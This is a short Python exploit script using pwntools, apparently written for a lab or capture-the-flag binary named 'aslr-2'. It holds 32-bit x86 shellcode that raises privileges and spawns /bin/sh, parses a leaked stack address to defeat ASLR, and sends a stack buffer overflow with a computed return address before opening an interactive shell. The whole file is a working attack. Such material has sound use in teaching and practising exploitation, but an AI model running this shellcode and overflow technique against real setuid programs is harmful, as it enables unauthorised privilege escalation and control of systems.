#!/usr/bin/env python
from pwn import *

#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

# You may set your shellcode in ENVP...
ENV = { 'SHELLCODE' : SHELLCODE }

# You may set your shellcode in ARGV...
ARG1 = SHELLCODE

# set ARG and ENV
p = process(["./aslr-2",ARG1],env=ENV)

# read output to read address leaks
data = p.recvuntil('name:')
# parse them. Split by newline
arr = data.split('\n')
ar =  arr[1].split(':')[1].split(' ')
print(ar)
stack_addr = int(ar[2],16)
print(hex(stack_addr))

# generate a crash to get the buffer address...
#p.send(SHELLCODE + "A"*256)
#p.wait()
#c = Core('core')
#addr_buffer = c.stack.find(SHELLCODE)
#print(hex(addr_buffer))

# we calculate offset = stack_addr - addr_buffer , offset = 0x88
new_addr_buffer = stack_addr - 0x88
print(hex(new_addr_buffer))

buffer = SHELLCODE + "A"*(0x88 - len(SHELLCODE)) + "BBBB" + p32(new_addr_buffer)

p.send(buffer)

p.interactive()
